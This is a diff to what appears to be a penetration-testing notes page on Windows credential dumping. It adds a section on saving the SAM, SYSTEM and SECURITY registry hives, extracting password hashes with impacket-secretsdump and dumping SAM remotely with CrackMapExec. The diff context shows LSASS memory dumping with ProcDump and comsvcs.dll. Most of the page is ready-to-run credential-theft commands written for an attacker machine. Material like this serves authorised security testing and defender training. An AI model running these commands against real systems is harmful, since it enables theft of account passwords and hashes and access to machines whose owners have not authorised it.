@@ -1,12 +1,60 @@
-# Windows LSASS
+# Windows
+
+## SAM
+
+You need to have administrator privileges to access the SAM Registry hive.
+
+### Registry Hives
+
+| Registry Hive | Description |
+|-|-|
+| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
+| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
+| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
+
+### Dumping the SAM Registry Hive
+
+Dump the SAM Registry hive using the `reg` command and transfer the files to your attacker machine.:
+
+```batch
+reg save HKLM\sam sam
+reg save HKLM\system system
+reg save HKLM\security security
+```
+
+Use `impacket-secretsdump` to extract the hashes from the SAM Registry hive:
+
+```bash
+impacket-secretsdump -sam sam -system system -security security LOCAL
+```
+
+### Dumping SAM Remotely
+
+Dump it using `CrackMapExec`:
+
+```bash title="Dump SAM with CrackMapExec"
+cme smb <ip> -u <username> -p <password> --sam
+```
+
+:::tip
+
+The output format is `username:RID:LMHASH:NTHASH`.
+
+:::
+
+### Cracking the Hashes
+
+Navigate to the [SMB Commands Cheatsheet](/commands-cheatsheet/smb#brute-forcing-credentials).
+
+## LSASS
 
 LSASS (Local Security Authority Subsystem Service) in Windows is a process responsible for enforcing security policies, managing user authentication, and auditing system events.
 
-## Dumping LSASS Memory
+### Dumping LSASS Memory
 
 LSASS memory dumps can pose serious security risks as they may contain sensitive information. This can include plaintext passwords, hash values, and other authentication details used in the system.
 
-### Task Manager
+#### Task Manager
 
 The easiest way to dump LSASS memory is to use Task Manager. You'll need UI access to the machine to do this.
 
@@ -16,7 +64,7 @@ The easiest way to dump LSASS memory is to use Task Manager. You'll need UI acce
 
 ![Task Manager](taskmanagerdump.png)
 
-### ProcDump
+#### ProcDump
 
 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a command-line utility that can be used to create memory dumps of processes.
 
@@ -36,7 +84,7 @@ You can also avoid reading the `lsass.exe` process by dumping a cloned process i
 procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 ```
 
-### comsvcs.dll
+#### comsvcs.dll
 
 ```batch title="Using comsvcs.dll to Dump LSASS Memory"
 .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
@@ -48,9 +96,9 @@ You can also use the PowerShell variant of this command.
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
 
-## Extracting Credentials
+### Extracting Credentials
 
-### Pypykatz
+#### Pypykatz
 
 This is the Linux version of [Mimikatz](https://github.com/gentilkiwi/mimikatz).
 
